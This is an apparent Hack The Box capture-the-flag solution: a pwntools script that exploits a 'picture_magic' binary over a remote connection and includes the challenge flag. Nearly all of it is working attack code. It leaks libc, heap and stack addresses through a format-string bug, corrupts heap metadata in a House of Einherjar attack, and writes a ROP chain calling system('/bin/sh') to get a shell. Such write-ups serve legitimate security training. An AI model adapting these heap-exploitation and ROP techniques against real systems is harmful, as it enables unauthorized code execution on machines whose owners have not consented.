#!/usr/bin/env python3

from pwn import *
import time

exe = ELF("./picture_magic_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.36.so")

context.binary = exe
# context.log_level = 'debug'

# r = process('./picture_magic_patched')
r = remote('94.237.52.252', 45241)

def gee():
    gdb.attach(r, gdbscript='''
b sell_picture
b create_picture
b malloc_printerr
b transform_final
''')
    time.sleep(2)


def create(w, h, p, leak=False): 
    r.sendlineafter("> ", "1")
    r.sendlineafter("Width: ", w)
    r.sendlineafter("Height: ", h)
    if leak == False:
        r.sendlineafter("=", p)
    else:
        r.recvline()
        ret = r.recvline()
        return ret
                    
def sell(idx, price, leak=False):
    # there is something kind of like a race because when we receive the leak, we receive all the data so there is nothing more to receive
    # so need to search for something on that stack that is usable
    # print(idx, price, leak)
    if leak == True:
        r.sendline(b"4")
        print('o')
    else:
        r.sendlineafter("> ", b"4")
    print(idx, leak)
    r.sendlineafter(": ", str(idx).encode()) # need to use encode or else it hangs for some reason??? doesnt seem like it's even related to encode actually 
    if leak == False:
        r.sendlineafter("? ", price)
    else:
        r.sendafter("for? ", price) # price 
        print("sent!")
        l = r.recvline()
        print(l)
        l = r.recvline()
        print(l)
        r.sendlineafter("? ", "y")
        return l

def transform(idx, option, sz, tr, tc):
    r.sendlineafter("> ", "2")
    r.sendlineafter(": ", str(idx))
    r.sendlineafter(": ", option)
    r.sendlineafter(": ", str(sz))
    r.sendlineafter(": ", str(tr))
    r.sendlineafter(": ", str(tc))

def new_name(p):
    r.sendlineafter("> ", "5")
    r.sendlineafter(": ", p)

def main():
    r.sendlineafter(": ", "a")
    h1 = str(1)
    w1 = str(1)
    p1 = "C" * 1
    create(h1, w1, p1)
    create(h1, w1, p1)
    create(h1, w1, p1)
    create(h1, w1, p1)

    sell(0, "0")
    sell(2, "0")
    sell(3, "0")
    print("Leaking libc")

    l = create('.', '.', p1, True) # get our leak into the main arena after dereferencing the allocated chunk of memory
    leak = l.decode().split("(")[1].split(")")[0].split(',')
    upper = int(leak[1].strip()).to_bytes(2, byteorder='big')
    lower = int(leak[0].strip()).to_bytes(4, byteorder='big')
    libc_leak = upper + lower
    print(f"libc leak: {libc_leak.hex()}")

    create(h1, w1, p1) # allocate again because an alloc failure does a free afterwards for cleanup in the code in the source binary

    l = create('.', '.', p1, True)
    leak = l.decode().split("(")[1].split(")")[0].split(',')
    upper = int(leak[1].strip()).to_bytes(2, byteorder='big')
    lower = int(leak[0].strip()).to_bytes(4, byteorder='big')
    heap_leak = upper + lower
    print(f"heap leak: {heap_leak.hex()}")
    libc_offset = 0x7f892fa6ecc0 - 0x7f892f878000

    # gee()

    # %p and %lx both work but i think i can use %p to print off more stuff from the stack like a heap address 
    sbuf_addr = 0x7ffcd8e91bf0
    stack_leak = 0x7ffcd8e8fa90
    s_offset = sbuf_addr - stack_leak
    print(f"Stack offset: {s_offset}")

    stack_leak = sell(1, b"%lx\n", True).decode().split("$")[1].split(".")[0].strip()
    print(f"stack leak: {stack_leak}")
    stack_leak = int(stack_leak, 16) + s_offset
    stack_leak = stack_leak.to_bytes(8, byteorder='big')
    print(f"stack leak with offset: 0x{stack_leak.hex()}")
    payload = 'b'
    new_name(payload)

    sell(1,"0")
    sell(0,"0")

   
        
    # Grabbing all the leaks done 
    #
    # We can now do the house of einherjar attack 
    # populating the stack with a fake value
    heap_to_stack_offset = int.from_bytes(stack_leak, byteorder='big') - int.from_bytes(heap_leak, byteorder='big') - 0x500 # 0x500 for the first chunk, another offset we need
    print(hex(heap_to_stack_offset))
    heap_to_stack_offset = ~heap_to_stack_offset & 0xffffffffffffffff

    stack_payload = b''
    stack_payload += p64(0) # prev_size unused
    stack_payload += p64(heap_to_stack_offset+1) # size that matches the size of the next chunk on the actual heap that we corrupted
    stack_payload += stack_leak[::-1]
    stack_payload += stack_leak[::-1]
    stack_payload += stack_leak[::-1] # yea we were seg faulting at this value but not sure why that was happening lol 
    stack_payload += stack_leak[::-1]
    new_name(stack_payload)

    create(str(1), str(1), "A") 
    create(str(1), str(1), "B")

    # gee()
    ##### yea this part here is actually useless because the previous chunk is calculated using the footer value
    # stack_leak = stack_leak[2:][::-1]
    # assert len(stack_leak) == 6
    # print(stack_leak)
    # create(str(6), str(1), b'\x01' * 5 + b'\n')
    # # gee()
    # for i, v in enumerate(stack_leak):
    #     if i == len(stack_leak) - 1: break
    #     print(hex(v), i)
    #     transform(1, 'a', v-1, 0, i)
    # transform(1, 'a', 0x7f-0xa, 0, 5) # this last one might not work 
    ##### So we'll save the code but again, it's not needed
 
    sell(0, "0")
    create(str(8), str(158), b'A' * 8*157 + b'\x01' * 16)
    
    hso = heap_to_stack_offset.to_bytes(length=8, byteorder='little')
    for i,v in enumerate(hso):
        if i == len(hso) - 1:break
        print("val: ", v-1)
        if i == 0: 
            v += 1
        transform(0, 'a', v-1, 157, i)

    transform(0, 'a', v-10, 157, i)

    # modify the footer to calculate the size of the offset, which should take us back to the stack pointer

    sell(1, "0")
    libc.address = int.from_bytes(libc_leak, byteorder='big') - libc.sym.main_arena - 96
    system = libc.sym.system 
    print(f"System addr: {hex(system)}")
    binsh = next(libc.search(b"/bin/sh\x00"))
    print(type(binsh))
    print(f"Binsh addr: {hex(binsh)}")

    # gee()
    # modify the size field so that we can pass the house of force check that looks out for unreasonable sizes
    payload = b''
    payload += p64(0x0)
    payload += p64(0x1000) # reasonable value for new malloc 
    new_name(payload)
    
    create(str(1), str(1), b'A')

    ret_addr = 0x7ffd51e46ca0 - 0x00007ffd51e46c60 # 0x40
    payload = b''
    payload += p64(0x0)
    payload += p64(0x501)
    payload += p32(0x8) # width [xxxx width] in mem
    payload += p32(0x10) # height [height xxxx] in mem

    new_name(payload)

    #####
    # Trying to drop into a shell now
    #####
    pop_rdi = libc.address + 0x0000000000023b65
    print(f"pop rdi: {hex(pop_rdi)}")
    print(f"libc address: {hex(libc.address)}")
    ret = libc.address + 0x000000000010b39c
    gadgets = [pop_rdi, binsh, ret, system] # need extra ret / nop instruction for alignment purposes along a 16 byte boundary
    gadgets = [int.to_bytes(i, byteorder='little', length=6) for i in gadgets]

    # gee()
    for i, v in enumerate(gadgets):
        # transform(0, 'a', v-10, 157, i)
        for j in range(6):
            # height, width 
            row = ret_addr // 0x8 - 2
            transform(1, 'm', 0, row, j) # transform each character into a white space first
            transform(1, 'a', (v[j] - 0x20) % 256, row, j)
            print(f"transforming {row} {j} {hex((v[j] - 0x20) % 256)}")
        ret_addr += 0x8
        # transform(0, 'a', ) # transfolrm the 6th byte from new line character -> white space
        # transform() # transform the 6 bytes into the actual address that we want
    # dont think we need to fix rsi in this case 
    # pop_rsi = # need to get kinda of lucky with the rsi value because if it isn't 0x0 it might not work 

    # r.sendlineafter("> ", "6")
    r.interactive()
    
if __name__ == "__main__":
    main()
    # HTB{h0u53_0f_31nh3rj4r_pu5h3d_b3y0nd_7h3_l1m17}


    

    ##### Messing around
    # h1 = str(10)
    # w1 = str(10)
    # payload = b'B' * 100
    # create(h1, w1, payload) # create first chunk since it's a stack 
    # create(h1, w1, payload) # create second that we want to overwrite
    # sell(0, "0") # free first chunk for reallocation
    # mh = 79
    # mw = 16
    #
    # create(str(mw), str(mh), b'A'*mh*mw) # allocate with first chunk to overflow second
    # create(str(6), str(1), b'C' * 6) # create a third chunk
    # create(str(6), str(1), b'D' * 6)
    #
    # sell(2, "0") # causes coalesce with previous chunk but we're erroring on an issue
    # create(str(2), str(1), b'AA')
    #

